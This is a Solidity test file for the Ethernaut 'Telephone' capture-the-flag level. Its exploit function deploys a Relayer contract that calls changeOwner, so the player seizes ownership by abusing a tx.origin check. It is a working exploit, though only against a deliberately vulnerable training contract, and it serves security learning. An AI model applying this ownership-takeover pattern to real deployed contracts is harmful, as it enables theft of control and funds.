// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // This level plays on the fact that tx.origin and msg.sender are different.
        // To solve, player has to become tx.origin

        vm.startPrank(player, player);

        // Deploy relayer contract
        Relayer relayer = new Relayer();

        // Call via relayer contract
        relayer.callTelephone(level, player);

        vm.stopPrank();
    }
}

contract Relayer {
    function callTelephone(Telephone _target, address _owner) external {
        _target.changeOwner(_owner);
    }
}
